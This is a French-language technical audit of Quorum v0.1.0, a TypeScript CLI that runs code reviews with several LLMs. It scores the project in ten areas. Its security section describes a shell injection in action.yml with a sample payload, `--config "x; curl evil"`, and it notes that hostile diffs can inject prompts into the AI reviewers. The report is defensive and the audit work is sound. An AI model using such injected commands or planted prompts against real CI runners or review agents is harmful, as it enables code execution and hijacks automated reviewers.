# 🔍 Audit technique approfondi — Quorum v0.1.0

**Date :** 13 juin 2026
**Périmètre audité :** 6 039 LoC `src/` (69 fichiers) · 5 368 LoC `tests/` (23 fichiers) · `bun test` 247/247 ✅ · `tsc --noEmit` ✅
**Méthodologie :** lecture exhaustive des sources, ADRs, ARCHITECTURE, CI, et reproduction locale des tests.

> Note : deux audits antérieurs (`audit-kimi2-7.md` = 74.5/100, `docs/audit-deepseek-pro.md` = 81/100) existent. Cette troisième passe est **indépendante** et confronte les constats.

---

## 1. Architecture — **8/10**

### Points forts
- **Couches strictes et unidirectionnelles** : `core/` (types purs, zéro I/O) → `providers/` → `pipelines/` + `consensus/` → `runtime/` → `ui/` → `cli/`. La règle "core has no I/O" est respectée et énoncée (`docs/ARCHITECTURE.md:17`, `src/core/*`).
- **Interface `Provider` minuscule mais load-bearing** : `id`, `capabilities()`, `review?()`, `dispose?()` (`src/core/provider.ts:5-36`). Le fait que `review` soit optionnel force la validation au binding (`src/reviewers/reviewer.ts:25-34`), pas à l'instanciation — c'est une vraie discipline.
- **Pattern Registry/Factory ouvert** : `ProviderRegistry` (`src/providers/registry.ts`) et `ConsensusRegistry` (`src/consensus/registry.ts`) sont découplés. Ajouter une stratégie ne touche que `semantic-v2.ts`-style ~45 lignes.
- **Event bus typé par union discriminée** : `QuorumEvent` (`src/core/events.ts:5-16`) force l'exhaustivité dans le `switch` côté consommateurs ; un nouveau type d'événement casse la compilation.
- **Domain model cohérent** : `Provider ≠ Model ≠ Persona ≠ Reviewer ≠ Pipeline`. C'est tenu partout, sans dérive.

### Points faibles
- **`src/runtime/runtime.ts:44-102` est un god-module** (172 lignes, 4 responsabilités : enregistrement, cache, résolution de reviewers, résolution de pipelines). Aucun mécanisme d'extension par plugin externe n'est réellement implémenté alors que le hook existe — `runtime.ts:49-61` est un registre en dur.
- **Frontière `reviewer.ts` ↔ `runtime.ts` floue** : `bindReviewer` valide la capability et applique un retry une fois (`src/reviewers/reviewer.ts:52-65`) — cette logique de retry appartient soit au reviewer soit à un décorateur, pas à `bindReviewer`.
- **`src/providers/continue-dev/` existe en répertoire vide** : dead code / oubli de suppression, non listé dans l'ARCHITECTURE.

### Risques
- L'interface `Provider` s'ossifiera dès qu'on voudra des "modes" autres que `review` (chat libre, plan-only, patch) — l'ADR 0004 l'admet comme trade-off.
- `runtime.ts` accumulera des providers built-in ; sans lazy import, le coût de démarrage grimpera linéairement avec le nombre de providers.

### Recommandations
- Extraire `runtime.ts` en `runtime/builtins.ts` (enregistrement) + `runtime/registry.ts` (résolution). Permettre un `plugins:` dans `quorum.yaml` qui charge des packages `@quorum/plugin-*` par `await import()` dynamique.
- Supprimer `src/providers/continue-dev/`.
- Transformer le retry de `bindReviewer` en `Reviewer.executeWithRetry()` composable.

---

## 2. Qualité du code — **8/10**

### Points forts
- **TypeScript strict agressif** : `noUncheckedIndexedAccess` + `exactOptionalPropertyTypes` + `noUnusedLocals` + `noUnusedParameters` + `noImplicitOverride` (`tsconfig.json:8-13`). Le compilateur est *vraiment* utilisé comme filet ; pas de `# type: ignore` que j'ai vus.
- **Discriminated unions partout** : `QuorumEvent`, `ProviderEvent`, `ChatStreamEvent`, `OllamaStreamEvent`, `ConsensusConfig` (`src/core/pipeline.ts:36-40`). Exhaustivité vérifiée statiquement.
- **Erreurs typées hiérarchiques** : `QuorumError` → 7 sous-classes avec contexte (`[providerId]`, `[reviewerId]`, bytes, fileCount) (`src/core/errors.ts:1-61`). C'est lisible côté `stderr`.
- **Fonctions courtes, noms explicites** : la médiane est ~15-25 lignes. `applyDiffLimits`, `resolveLazy`, `assertTrustedBinary` sont des one-liners nommés.
- **Pas de `any` repéré** dans le code applicatif (j'ai vu `as unknown as` au plus une fois dans `subprocess.ts:54` pour le type `Bun.Subprocess.stdin` qui n'expose pas la même API Node — acceptable).

### Points faibles
- **Casts sur les configs providers** : `const c = cfg as CodexCliConfig` (`src/providers/codex-cli/index.ts:13-15`, `claude-code/index.ts:13`, `cursor-agent/index.ts:19`, `kilo-code/index.ts:11`, `opencode/index.ts:9`). Le schéma Zod a pourtant déjà validé. C'est un cas où `z.infer<typeof Schema>` couvre tout, et où `as` est de la dette. **Pire** : pour `subprocess.ts:46` `this.cfg = config as SubprocessBaseConfig` — un changement de schéma dans `ClaudeCodeConfigSchema` casserait silencieusement l'exécution locale.
- **Tests dupliqués dans `config.test.ts`** : 3 blocs copiés-collés (`tests/config.test.ts:174-190` reprend 144-156, `192-209` reprend 158-172, `229-257` reprend 98-126). C'est un copier-coller humain visible.
- **Magic string `'***redacted***'`** : répétée 2× dans `src/config/redact.ts:25,36`. Pas de constante.
- **Parser JSON maison** : `extractJsonObject` + `extractBalancedBraces` (`src/reviewers/output.ts:235-270`) est subtil : pas de gestion de BOM, pas d'UTF-8 invalide, échoue silencieusement sur les sauts de ligne dans les chaînes.
- **Mode strict sur les `as` du `pipeline.ts`** : `src/pipelines/executor.ts:174-182` re-caste `count` via un type indexé `summaries[number]` qui n'apporte rien.

### Risques
- Les casts providers deviendront une source de bugs quand un champ sera ajouté au schéma (oubli côté `buildArgs`).
- Le parser JSON fera diverger un jour un cas tordu (tokenizer LLM mal aligné).

### Recommandations
- Pour les 6 providers subprocess : changer le pattern de `createSubprocessProvider` pour passer `cfg` déjà typé (Zod.parse) à `buildArgs`, pas un `unknown`.
- Supprimer les doublons de `config.test.ts` (DRY).
- Extraire `REDACTED_VALUE` dans `src/config/sensitive-fields.ts`.

---

## 3. Performance — **7/10**

### Points forts
- **Vrai parallélisme borné** : `runWithConcurrencyLimit` (`src/pipelines/executor.ts:195-208`) + `effectiveConcurrencyLimit` (`executor.ts:155-163`) combinent `pipeline.maxConcurrency` ET `provider.maxConcurrentReviews` (utile pour `opencode` qui force `maxConcurrentReviews: 1`).
- **Streaming SSE** côté OpenRouter (`src/providers/openrouter/client.ts:130-188`) et Ollama (`src/providers/ollama/client.ts:51-76`) — pas de buffer complet.
- **Backpressure configurable** : `timeoutMs`, `maxConcurrency`, `maxReviewers`, `maxTotalCostUsd` (`src/core/pipeline.ts:42-51`).
- **Budget guard** : `BudgetTracker` (`src/pipelines/budget.ts:15-53`) interrompt à mi-parcours sur dépassement.
- **Capping stdout/stderr** subprocess : 1 MB / 64 KB (`subprocess.ts:26-27`) — protège d'un LLM bavard.

### Points faibles
- **Zéro cache cross-exécution** : `providerCache` (`runtime.ts:63`) ne survit pas à un nouveau `createRuntime()`. Chaque invocation du CLI repart de zéro.
- **Pas de chunking intelligent du diff** : le diff entier est passé en string dans le prompt (`src/cli/commands/review.ts:91`, `buildReviewInstruction` à `review.ts:254-267`). Sur 200 KB de diff, on brûle des tokens d'input pour les zones inchangées.
- **`parseReportSummary` du TUI** parse le markdown à coups de regex fragiles (`src/ui/tui/utils.ts:99-133`) : le moindre changement de format dans `renderMarkdownReport` casse silencieusement le dashboard.
- **Pas de rate-limit proactif** : seul OpenRouter a des retries (`client.ts:92-127`).

### Risques
- Sur monorepos (50k+ LoC diff), coût et latence explosent linéairement.
- Re-vérifier un même diff 3× avec 3 providers consomme 3× le prompt identique.

### Recommandations
- Cache disque des résultats indexé par hash de diff + provider + model (`.quorum/cache/`) avec TTL.
- Frontmatter YAML structuré dans les rapports archivés (au lieu de regex sur markdown).
- `--files` mode qui injecte les fichiers par référence au lieu du diff unifié.

---

## 4. Sécurité — **8/10**

### Points forts
- **Refus d'exécuter un binaire local au repo** : `assertTrustedBinary` (`src/providers/subprocess.ts:120-131`) résout le chemin canonique et vérifie qu'il n'est pas sous `cwd` sauf `allow_project_binary: true`. C'est exactement le bon garde-fou.
- **Allowlist env subprocess** : `DEFAULT_ENV_ALLOWLIST` (`subprocess.ts:28-41`) — `PATH`, `HOME`, `XDG_*` seulement. Les variables sensibles type `AWS_*`, `GITHUB_TOKEN` ne fuitent pas.
- **Sandbox Codex explicite** : `danger-full-access` n'est autorisé que si `approval_policy !== 'never'` (`codex-cli/schema.ts:25-30`) — `codex-cli/index.ts:16-18` lève une erreur si `approval_policy: never`. Anti-fat-finger propre.
- **Refus `--report` hors repo** par défaut (`src/cli/commands/review.ts:155-159`, opt-in via `--allow-report-outside-root`).
- **Diff traité comme untrusted** : fence dynamique `buildSafeFence` (`review.ts:240-252`) + encart pédagogique dans l'instruction.
- **Redaction des secrets** : `redactConfig` (`src/config/redact.ts:24-41`) + `getSensitiveFields` par provider (`sensitive-fields.ts`).
- **Sanitization terminal** : `sanitizeTerminalText` strip les séquences ANSI et caractères de contrôle (`src/ui/terminal.ts:43-45`).
- **Échappement markdown dans PR comments** : `escapeWorkflowCommandData/Property` (`src/ci/report-check.ts:47-58`) percent-encode `:`, `,`, `%`, `\n` pour les `::error` GitHub.

### Points faibles
- **Injection shell dans `action.yml`** : `run: bun run "$GITHUB_ACTION_PATH/src/cli/index.ts" review --pipeline '${{ inputs.pipeline }}' --config '${{ inputs.config }}'` (`action.yml:67-72`). Si un attaquant contrôle `inputs.config` (par ex. via PR depuis une action tierce compromise ou via un re-tag), il peut injecter `--config "x; curl evil"`. Le simple-quote est contournable par `'` dans la valeur.
- **Pas de filtre sur les `<instruction>` du diff** : la fence protège des ` ``` ` mais pas des `<instruction>...</instruction>` que `sanitizeUserAnswer` retire côté `qa.ts:300-306` mais pas côté diff.
- **Fuite potentielle d'env provider** : `buildSubprocessEnv` (`subprocess.ts:142-152`) whitelist, OK ; mais un provider pourrait passer `env: { GITHUB_TOKEN: ... }` via son schéma — pas d'audit.
- **Pas de allowlist de providers** dans `quorum.yaml` : un attaquant qui contrôle la config peut faire exécuter n'importe quel `binary` connu.
- **Logs d'erreur verbeux** : `ProviderRuntimeError` met 500 chars du body HTTP dans le message (`client.ts:118`). Si un proxy répond 500 avec un token en clair dans le body, il atterrit en stderr.

### Risques
- `action.yml:67-72` : **un seul caractère `'` dans `inputs.config` casse l'isolation** et permet l'exécution arbitraire dans le runner GitHub Actions.
- Prompt injection à grande échelle (un commit hostile peut injecter des instructions dans le diff visible par tous les reviewers).

### Recommandations
- `action.yml` : passer `--config "$QUORUM_CONFIG"` via une variable d'environnement, échappée par GH Actions (les `env:` sont safe).
- Ajouter un `safeInput(text)` qui strip `<instruction>`, `system:`, `assistant:`, ` ``` ` au-delà d'un seuil.
- Tronquer les bodies d'erreur HTTP à 200 chars et exiger un opt-in `--verbose-errors` pour avoir le détail.
- Ajouter une `providerEnvAllowlist` dans la config pour exclure explicitement `*TOKEN*`, `*SECRET*` du subprocess env.

---

## 5. Tests — **8/10**

### Points forts
- **247 tests, 0 fail, 585 expect()** — couverture structurelle solide.
- **Très bon usage du DI** : `CliDeps`, `PluginCtx`, `InMemoryEventBus`, `captureBus()` fake. Les tests n'instancient jamais un vrai LLM.
- **Faux binaires subprocess** : `tests/codex-cli.test.ts:18-21` crée un binaire `sh` temporaire qui écrit ses args dans un fichier puis renvoie du JSON — pattern réutilisable et propre.
- **Cas limites bien couverts** : concurrence parallèle vs séquentiel (`pipeline.test.ts:35-87`), timeout, budget exceeded, partial failure, abort, project binary refusé, env allowlist (`tests/subprocess.test.ts`), contradictions consensus.
- **Tests de régression précis** : le `audit-kimi2-7.md` mentionnait l'absence de commande `init` ; `tests/cli.test.ts:41-58` assert qu'elle est bien absente — bon reflex.

### Points faibles
- **TUI à 0% de couverture** : `src/ui/tui/{app,pipelines-tab,reviews-tab,utils}.tsx` — aucun test n'exerce `useInput`, le switch de tabs, l'expansion pipeline, le `parseReportSummary`.
- **`src/interactive/qa.ts` à couverture très faible** : `collectQuestions`, `deduplicateQuestions`, `promptQuestions` non testés en isolation (seulement via `runInteractive`).
- **Tests `output.test.ts` à confirmer** : pas encore lu exhaustivement, mais vu la taille (5 719 bytes) probable couverture des branches évidentes seulement.
- **3 blocs dupliqués** dans `config.test.ts` (déjà cité).
- **Pas de tests de fuzzing pour `extractJsonObject`** (`reviewers/output.ts:235-270`).

### Risques
- Régression silencieuse du dashboard (parsing markdown + états React).
- Régression silencieuse du mode interactif Q&A.

### Recommandations
- Tests pour `parseReportSummary` et `extractPipelines` (logique pure, trivialement testable).
- Tests `collectQuestions` / `deduplicateQuestions` / `promptQuestions` avec mock de `readline`.
- Test E2E `cmdDashboard` en stubant `ink.render`.

---

## 6. Documentation — **9/10**

### Points forts
- **README** : 427 lignes, sections CLI exhaustives, exemples de prompts, CI, modèle de sécurité, table des consensus strategies (`README.md:386-411`).
- **`docs/ARCHITECTURE.md`** : 525 lignes, design principles, domain model, layer diagram, implémentation map, risks/tradeoffs, deferred scope (`ARCHITECTURE.md:486-512`).
- **6 ADRs** numérotés et datés (`docs/adr/0001-0006`), format MADR.
- **`quorum.yaml.example`** très commenté, 156 lignes avec 3 personas détaillées.
- **`AGENTS.md`** (30 lignes) pose les conventions de code aux agents IA.
- **`.env.example`** clair sur ce qui est API-based vs subprocess-based.
- **Skill `skills/review/SKILL.md`** : wrapper thin, conforme à l'esprit (CLI d'abord, distribution ensuite).

### Points faibles
- **Pas de `CONTRIBUTING.md`** autonome (tout est dans `AGENTS.md`).
- **Pas de `CHANGELOG.md`** (alors que `git log` mentionne 100+ commits depuis le 4 juin 2026).
- **Pas de TypeDoc / API doc générée**.
- **Pas de doc sur le modèle de menaces** (la section "Security model" du README fait 11 lignes).
- **Pas de guide de debug** ("review returned no output" : où chercher ?).

### Risques
- Onboarding d'un nouveau dev : ~1-2 jours pour comprendre les couches, plus si pas d'expérience avec l'event-bus pattern.

### Recommandations
- `CHANGELOG.md` extrait des `git log --oneline` jusqu'à v0.2.0.
- Section "Debugging" dans le README : comment lire `rawOutput` d'un reviewer qui échoue, comment activer `--show-tokens`.
- TypeDoc en `pnpm run docs` (Bun supporte TypeDoc nativement).

---

## 7. DevOps — **6/10**

### Points forts
- **CI GitHub Actions** : `.github/workflows/ci.yml` (typecheck + test), version Bun pinnée à `1.3.3`, lockfile frozen.
- **GitHub Action composite** : `action.yml` 150 lignes, secrets injectés via `env:` (OK), skip-on-fork propre.
- **`bun.lock`** commité, `bun.lockb` activé.
- **`postinstall`** : crée les symlinks `~/.agents/skills/quorum-*` (idempotent, testé).
- **Distributions** : CLI + GitHub Action + Claude Code Skill (3 canaux, surface cohérente).

### Points faibles
- **Aucun Dockerfile** — la CI installe Bun à la volée ; l'utilisateur doit faire de même.
- **Aucun release process** automatisé (pas de tag, pas de GitHub Release, pas de changelog).
- **`bunfig.toml` avec `exact = false`** (`bunfig.toml:2`) — laisse Bun résoudre des ranges permissives. À `1.1+` la dérive est mineure mais c'est un signal de non-reproductibilité.
- **`package.json` n'a ni `files`, ni `exports`, ni `types`, ni `bin` propre** : impossible de `bun publish` ou `npm publish` proprement. La `bin` est définie (`package.json:7-9`) mais pointe vers `src/cli/index.ts` sans compilation préalable.
- **Pas de monitoring / télémétrie** : aucune métrique d'usage, de coût, de taux d'échec. Impossible de savoir combien de runs échouent.
- **Logs structurés absents** : `console.log` dans `postinstall`, stderr brut pour erreurs. Pas de niveau, pas de corrélation.
- **Pas de pre-commit hook** (l'audit-kimi2-7 mentionne un retrait explicite).
- **Pas de dépendance auditee** : pas de `npm audit`, pas de `bun audit`, pas de Dependabot/Renovate.

### Risques
- Build non reproductible cross-machine.
- Pas de signal de régression en prod.
- Impossibilité de publier sur npm sans refactor du `package.json`.

### Recommandations
- `Dockerfile` minimal : `FROM oven/bun:1.3.3-alpine`, `COPY . .`, `RUN bun install --frozen-lockfile`, `ENTRYPOINT ["bun", "run", "src/cli/index.ts"]`.
- `package.json` : ajouter `files: ["src", "README.md", "quorum.yaml.example", "action.yml"]`, `types: "src/index.ts"`, `bin` propre.
- Workflow release : `release.yml` qui tag, build, publie l'image GHCR.
- Activer `exact = true` dans `bunfig.toml`.

---

## 8. Maintenabilité — **8/10**

### Points forts
- **Conventions de code homogènes** : kebab-case, ESM, `.ts` dans les imports, single quotes, semicolons. Cohérent sur 100% des fichiers que j'ai lus.
- **Commits propres** : `feat:`, `refactor:`, `docs:` (vérifié dans `git log`).
- **Stratégies de consensus découplées** : ajouter une 5e stratégie = 1 fichier + 1 ligne dans `runtime.ts`.
- **Subprocess providers factorisés** : `createSubprocessProvider` + `createSubprocessMetaReviewer` = 70% de la duplication subprocess éliminée.
- **TypeScript strict rattrape les régressions** : `noUncheckedIndexedAccess` empêche les `arr[i]` non vérifiés.

### Points faibles
- **God-files** : `runtime.ts` (172), `subprocess.ts` (316), `workspace.ts` (294), `report-check.ts` (249), `markdown.ts` (158).
- **`consensus/` est éclaté en 10 fichiers** : frontières floues entre `grouping.ts`, `grouping-v2.ts`, `similarity.ts`, `contradictions.ts`, `meta-reviewer.ts`. La doc ARCHITECTURE ne fait pas la cartographie.
- **`opencode/index.ts` exporte deux factories** (`openCodeFactory` + `openCodeGoAliasFactory`) avec un builder partagé via closure mutable (`src/providers/opencode/index.ts:6-44`) — pattern qui ne survivra pas à un 3e alias.
- **CLI commands couplent parsing + orchestration + rendering** : `review.ts` (299 lignes) fait tout.
- **Pas de façade `ConsensusEngine`** : `computeConsensus` est une fonction libre dans `executor.ts:210-237`.

### Risques
- Un nouveau contributeur sur le consensus doit lire 10 fichiers pour comprendre le pipeline.
- La duplication de `createMetaReviewer` dans 6 providers est déjà visible (`codex-cli/index.ts:24-30`).

### Recommandations
- Refactor `opencode/index.ts` en `buildOpenCodeBuilder(cfg)` retournant un objet immutable.
- Encapsuler `consensus/` derrière `ConsensusEngine` (façade).
- Alléger `cmdReview` en extrayant `loadAndResolve` et `renderAndArchive` dans des helpers.

---

## 9. Standards et bonnes pratiques — **7/10**

### Points forts
- **TypeScript ESM strict** : conforme aux standards modernes 2025+.
- **Pas de framework lourd** : dépendance runtime = 4 (ink, react, yaml, zod). Minimalisme.
- **Bun natif** : tire parti de `Bun.spawn`, `Bun.file`, `Bun.Glob`, `Bun.write` sans wrapper.
- **Validation Zod partout** : config + schemas providers.
- **Conventional commits** observés dans le log.

### Points faibles
- **Aucun linter** : `package.json:16` `"lint": "tsc --noEmit"` — c'est de la compile, pas du lint. Pas de Biome, pas d'ESLint, pas de Prettier.
- **Pas de formatter** : style respecté *manuellement* ; un nouveau contributeur peut dévier.
- **Pas de static analysis** : pas de `ts-prune`, `knip`, `depcheck`.
- **`verbatimModuleSyntax: false`** (`tsconfig.json:22`) — mélange `import type` et `import` de manière inconsistante (j'ai vu les deux styles dans le même fichier).
- **Versions caret-only** : `^5.5.0` pour TypeScript, `^3.23.0` pour Zod. OK en interne, mais une release v1.0 devrait geler.
- **Pas de `engines.node`** (que `bun`).

### Risques
- Dérive stylistique à long terme.
- Pas de détection de code mort automatisée.

### Recommandations
- Ajouter Biome (lint + format) en 30 minutes.
- `ts-prune` en script `bun run unused` pour nettoyer.
- `tsconfig.json` : `verbatimModuleSyntax: true` (cohérence + tree-shaking).

---

## 10. Qualité globale — **8/10**

### Points forts
- **Maturité remarquable pour un v0.1.0** : 8 providers, 4 stratégies, 2 modes (diff/plan), TUI, GitHub Action, skill.
- **Robustesse** : tests partiels, timeouts, budgets, abort, refus de binaires hostiles.
- **Cohérence** : partout la même rigueur (events typés, redaction, env allowlist, sandbox explicite).
- **Pas de dette de "quick hack"** visible.

### Points faibles
- **Quelques trous opérationnels** : pas de Docker, pas de release, pas de monitoring.
- **Couverture TUI = 0%** : seul vrai risque de régression silencieuse.
- **Faiblesse unique sur la sécu** : injection shell `action.yml` (corrigible en 1 ligne).

---

## Score technique global

| Critère | Note |
|---|---|
| Architecture | 8/10 |
| Qualité du code | 8/10 |
| Performance | 7/10 |
| Sécurité | 8/10 |
| Tests | 8/10 |
| Documentation | 9/10 |
| DevOps | 6/10 |
| Maintenabilité | 8/10 |
| Standards | 7/10 |
| Qualité globale | 8/10 |

## **Note finale : 77/100 — Bon (70-79)**, en haut de la fourchette et *presque* "Très bon" (il manque 3 points : DevOps 6, Standards 7, Performance 7).

---

# 🔴🟠🟡🟢 Top 10 des problèmes

| # | Sev. | Problème | Fichiers | Difficulté | Gain |
|---|---|---|---|---|---|
| 1 | 🔴 | **Injection shell `action.yml`** : `--config '${{ inputs.config }}'` | `action.yml:67-72` | Trivial | Sécurité CI |
| 2 | 🔴 | **TUI à 0% de tests** (parsing fragile + states React) | `src/ui/tui/*.tsx` | Moyenne | Fiabilité dashboard |
| 3 | 🟠 | **Casts providers** : 6× `as XxxConfig` malgré Zod | `codex-cli/index.ts:13`, `claude-code/index.ts:13`, etc. | Facile | Robustesse runtime |
| 4 | 🟠 | **Pas de Dockerfile** : onboarding dépend de Bun installé | — | Facile | Reproductibilité |
| 5 | 🟠 | **`bunfig.toml` `exact = false`** + pas de release process | `bunfig.toml:2` | Facile | Builds déterministes |
| 6 | 🟠 | **Pas de cache cross-run** : même diff = 3× coût | `runtime.ts:63` | Moyenne | Coût +30 à -90% |
| 7 | 🟡 | **Tests dupliqués** `config.test.ts` (3 blocs copiés) | `tests/config.test.ts:174-209, 229-257` | Trivial | Lisibilité tests |
| 8 | 🟡 | **God-file `runtime.ts`** (172 lignes, 4 responsabilités) | `src/runtime/runtime.ts` | Moyenne | Évolutivité |
| 9 | 🟡 | **Aucun linter/formateur** (lint = `tsc`) | `package.json:16` | Facile | Cohérence style |
| 10 | 🟢 | **`continue-dev/` répertoire vide** (oubli) | `src/providers/continue-dev/` | Trivial | Propreté |

---

# ✅ Quick wins (< 1 jour chacun)

1. **Fixer `action.yml`** : remplacer `--config '${{ inputs.config }}'` par `--config "$QUORUM_CONFIG"` via `env:` dans le step (5 min, gain sécurité).
2. **Supprimer `src/providers/continue-dev/`** (1 min).
3. **Dédoublonner `config.test.ts`** (10 min).
4. **`bunfig.toml` → `exact = true`** (1 min).
5. **Ajouter Biome** (lint + format) + script `bun run lint` / `bun run format` (30 min).
6. **Dockerfile** `FROM oven/bun:1.3.3-alpine` + `ENTRYPOINT` (15 min).
7. **Extraire `REDACTED_VALUE`** + tests `redact.ts` (15 min).
8. **Tests pour `parseReportSummary` et `extractPipelines`** (30 min).

---

# 📊 Dette technique

| Métrique | Niveau | Commentaire |
|---|---|---|
| Dette globale | **Modérée** | Architecture saine, outillage en retard. |
| Risque maintenance | **Moyen** | God-files + casts providers = points de friction. |
| Facilité d'évolution | **Bonne** | Registres + ADRs = ajouts bien encadrés. |
| Onboarding | **Bon** | README + ARCHITECTURE + ADRs + AGENTS = 2-3 jours pour être productif. |
| Risque régression | **Moyen** | TUI non testé, casts providers silencieux. |

---

# 🧠 Analyse senior

### 1. Projet maintenable à long terme ?
**Oui, conditionnellement.** La fondation est solide et les ADRs prouvent une vraie réflexion. Les 2 conditions : (a) combler le trou DevOps (Docker + releases + lint), (b) tester le TUI.

### 2. À l'aise pour reprendre ce projet ?
**Oui, sans hésiter.** Le domaine est bien modélisé, les tests sont présents, la doc est au-dessus de la moyenne pour un v0.1. Le pire défaut serait cosmétique (pas de lint), pas structurel.

### 3. Standards modernes respectés ?
**Côté code : oui.** TypeScript strict 2025+, ESM, discriminated unions, Zod. **Côté outillage : non.** Pas de lint, pas de format, pas de Docker, pas de release automation. Pour une boîte "moderne" c'est 2/3.

### 4. Les 5 premiers chantiers
1. **Sécurité CI** : `action.yml` shell injection (1 ligne).
2. **Outillage** : Biome + Dockerfile + release workflow.
3. **Tests TUI + Q&A** : porter la couverture de 0% à 80% sur `ui/tui/` et `interactive/`.
4. **Casts providers** : passer `cfg` déjà typé à `buildArgs` (ou un `z.infer` + `satisfies`).
5. **Cache cross-run** : SHA256(diff) + provider + model → `.quorum/cache/<hash>.json`.

### 5. Note de CTO
**77/100 — Bon projet, en haut de la fourchette.** C'est du "production-ready pour usage interne", pas encore "enterprise-grade" mais *proche*. Un sprint de 2 semaines sur DevOps + 1 sprint sur tests TUI = **85+** (Très bon). Le plafond n'est pas architectural, il est opérationnel.

**Verdict final : Quorum est un projet qui mérite d'être continué, pas un projet à reprendre de zéro.**
